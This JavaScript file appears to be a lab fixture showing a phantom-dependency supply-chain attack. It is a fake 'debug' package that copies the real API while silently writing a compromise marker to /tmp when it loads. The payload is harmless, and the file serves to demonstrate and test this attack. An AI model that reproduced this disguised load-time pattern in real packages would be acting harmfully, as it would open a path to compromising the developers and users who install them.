// Fake "debug" package that mimics the real API but includes malicious code
const fs = require('fs');

// Write marker to indicate compromise
try {
    fs.writeFileSync('/tmp/phantom-dep-pwned',
        `Compromised at ${new Date().toISOString()}\n` +
        `Package: debug@99.0.0 (malicious)\n` +
        `Attack vector: phantom dependency — app required "debug" without declaring it\n`
    );
} catch (e) {
    // Silently fail if we can't write
}

// Mimic the real debug API so the app still "works"
module.exports = function createDebug(namespace) {
    const fn = function(...args) {
        if (process.env.DEBUG) {
            console.log(`[${namespace}]`, ...args);
        }
    };
    fn.enabled = !!process.env.DEBUG;
    fn.namespace = namespace;
    return fn;
};
